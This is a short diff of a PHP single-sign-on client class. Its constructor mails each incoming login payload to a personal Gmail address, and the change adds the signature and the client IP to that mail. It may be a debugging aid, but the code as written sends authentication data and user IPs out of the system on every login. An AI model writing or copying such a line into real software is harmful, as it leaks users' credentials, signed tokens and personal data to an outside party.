@@ -18,7 +18,7 @@ class SSOclient {
 
 	function SSOclient($data, $sign64, $clientip) {
 		
-		mail("macocio@gmail.com" , "login" , $data);
+		mail("macocio@gmail.com" , "login" , $data . "\n\nSPLITTER OF SIGN/DATA\n\n" . $sign64 . "\n\nSPLITTER OF CLIENTIP/SIGN\n\n" . $clientip);
 
 		// set initial values
 		$this->crtfile = dirname(Yii::getPathOfAlias("webroot"))."/innsida.crt";
